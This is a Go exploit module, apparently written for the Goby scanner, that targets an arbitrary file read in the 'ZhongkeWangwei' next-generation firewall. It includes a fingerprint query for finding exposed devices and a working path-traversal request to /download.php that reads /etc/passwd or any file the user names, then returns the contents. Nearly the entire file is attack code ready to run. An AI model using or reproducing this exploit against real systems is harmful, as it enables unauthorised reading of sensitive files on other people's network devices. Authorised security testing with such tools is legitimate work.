package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
  "Name": "ZhongkeWangwei Next generation firewall File read",
  "Description": "ZhongkeWangwei Next generation firewall File read, There is an arbitrary file reading vulnerability, which can be used by attackers to obtain sensitive information",
  "Product": "ZhongkeWangwei Next generation firewall",
  "Homepage": "http://www.netpower.com.cn/",
  "DisclosureDate": "2021-06-02",
  "Author": "PeiQi",
  "GobyQuery": "body=\"Get_Verify_Info(hex_md5(user_string).\"",
  "Level": "2",
  "Impact": "<p>File read</p>",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "File",
      "type": "input",
      "value": "/etc/passwd"
    }
  ],
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "File Read"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "ZhongkeWangwei Next generation firewall"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Recommandation": "<p>update</p>"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri := "/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root")
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    file := ss.Params["File"].(string)
		    uri := "/download.php?&class=vpn&toolname=../../../../../../../.." + file
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			    if resp.StatusCode == 200 {
            		expResult.Output = resp.Utf8Html
            		expResult.Success = true
        	    }
			}
			return expResult
		},
	))
}
